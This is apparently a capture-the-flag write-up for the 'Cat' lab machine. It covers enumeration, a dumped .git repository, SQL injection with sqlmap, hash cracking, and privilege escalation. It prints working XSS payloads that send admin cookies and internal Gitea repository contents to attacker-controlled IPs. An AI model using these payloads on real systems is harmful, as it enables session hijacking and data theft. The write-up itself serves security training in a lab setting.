Port Scanning
Using nmap, we are able to identify any open ports. The following ports are open;
•	SSH (22)
•	Apache Web Server (80)
Nmap –sCV 10.10.11.53
 
From the scripts scan, we can see a .git repository on the web server. Further enumeration using gobuster has been conducted but had no clear results. So now, we must add the machine’s IP to the hosts file in your machine.

 
Initial foothold
Using git-dumper, we able to extract the files in the .git directory of the web server.
Git-dumper http://cat.htb/.bit gitFolder

 
We then explore some of the interesting files gained.
 
On the join.php file, there is no input sanitization for the username, possible XSS. Hmm interesting..
 
On the contest.php, the data of the users is sent to the SQL database. Including the username, which could be malicious.
 
On the admin.php, the admin (axel) either accepts or rejects the cat.
 
The accept_cat.php is susceptible to SQLi, where the sql_insert statement is being used.
 
On the config.php some information about the SQL database and configuration is given.
 
Using all this information from the file, we can construct an attack procedure.

First, we can create a user with the XSS payload in the username field, to gain admin cookies.
<script>document.location='http://10.10.14.120:1111/?c='+document.cookie;</script>
 
Then register a normal cat in the contest.
 
From here, when admin accepts the cat, we gain his cookies.
 
Which we use, to hijack his session.
 
We are able to gain access to the admin.php, demonstrating successful XSS attack, now to get information from the SQL db, since we have the admin cookie.
 


 
Since accept_cat.php is vulnerable to SQLi, we use the data provided from it, catID and catName to form a sqlmap comand.
sqlmap -u "http://cat.htb/accept_cat.php" --data="catId=1&catName=a" --cookie="PHPSESSID=ikn31got0uppvf5h3n5snv6cqh" -p "catName" --dbms=SQLite --dump --level=5 --risk=3 --flush-session --threads=5 --hex

 
During the process, we are able to gain some usernames and hashed passwords, these are noted down. Some of the users include; rosa, axel(admin), robert, and more..


 
The hashes identified are md5 hashes.
 
Using johntheripper, we are able to obtain the hashed credentials, note only user rosa has a correct hash, rest of the users do not.
 
Using the credentials, we are able to SSH into rosa’s user.
 
Using linPEAS, we are aiming to privilege escalate or find some information.
 
In the apache access logs, which are usually hidden contain the password of the user axel.
 Using that, we are able to SSH into the axel user, and we see a new mail sent to axel.
 
And obtain the user flag.
 
Reading out the mail from rosa, we see a web page being hosted on the port 3000, which contains information about employees.
 As seen, the web server is being hosted on port 3000, in order to access it need to do SSH tunnelling back to my machine.
 
Using SSH tunnelling on port 3000.
 
We are able to login into the gitea, using axel’s credentials.
 We see this web server is powered by gitea version 1.22.0. Which is, vulnerable to Persistent XSS.
 
Using that information, I formed a XSS that accesses the employee-management readme and sends to my python server, accessing that information.
<a href="javascript:
fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md')
  .then(r => r.text())
  .then(d => fetch('http://10.10.14.182:8000/?d=' + btoa(d)))
">XSS test</a>

 
The link of the git is then sent to jobert, as instructed in the mail.
echo "http://localhost:3000/axel/test/" | sendmail jobert@localhost
 
The obtained data is then decoded from base64, getting the following information;
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
In order to get the contents of the git, the following script is formed.
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/')
  .then(r => r.text())
  .then(d => fetch('http://10.10.15.95:8000', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'data=' + encodeURIComponent(d)
  }))">
  Click me
</a>

 
After decoding the received data, the following paths are found; 
 
There are the interesting paths, containing files;
/administrator/Employee-management/src/branch/main/chart.min.js
/administrator/Employee-management/src/branch/main/dashboard.php
/administrator/Employee-management/src/branch/main/index.php
/administrator/Employee-management/src/branch/main/logout.php
/administrator/Employee-management/src/branch/main/README.md
/administrator/Employee-management/src/branch/main/style.css

Upon finding those paths, I used the XSS script to get back data from those paths, and from index.php I obtained the admin credentials, getting the root flag.
 
 

